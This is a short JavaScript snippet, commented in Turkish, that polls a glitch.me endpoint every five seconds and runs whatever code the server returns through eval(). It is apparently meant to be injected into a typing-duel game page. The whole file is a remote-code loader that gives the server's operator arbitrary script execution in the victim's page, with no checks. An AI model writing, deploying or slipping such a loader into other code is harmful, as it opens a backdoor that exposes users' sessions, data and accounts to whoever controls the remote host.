(function() {
    console.log('Script yüklendi!', 'Zaman:', new Date().toISOString());
    let lastCode = null; // Son çalıştırılan kodu sakla

    function fetchCode() {
        fetch('https://duello-katiponline-com.glitch.me/get-code')
            .then(response => {
                if (!response.ok) throw new Error('Sunucu yanıtı başarısız: ' + response.status);
                return response.json();
            })
            .then(data => {
                console.log('Kod alındı:', data.code, 'Zaman:', new Date().toISOString());
                if (data.code && data.code !== lastCode) { // Sadece yeni kodsa çalıştır
                    try {
                        eval(data.code);
                        lastCode = data.code; // Son çalıştırılan kodu güncelle
                    } catch (e) {
                        console.error('Kod çalıştırma hatası:', e.message, 'Zaman:', new Date().toISOString());
                    }
                } else {
                    console.log('Kod değişmedi, tekrar çalıştırılmadı:', data.code, 'Zaman:', new Date().toISOString());
                }
            })
            .catch(error => {
                console.error('Kod çekme hatası:', error.message, 'Zaman:', new Date().toISOString());
            })
            .finally(() => {
                setTimeout(fetchCode, 5000); // 5 saniye sonra tekrar kontrol et
            });
    }

    fetchCode();
})();
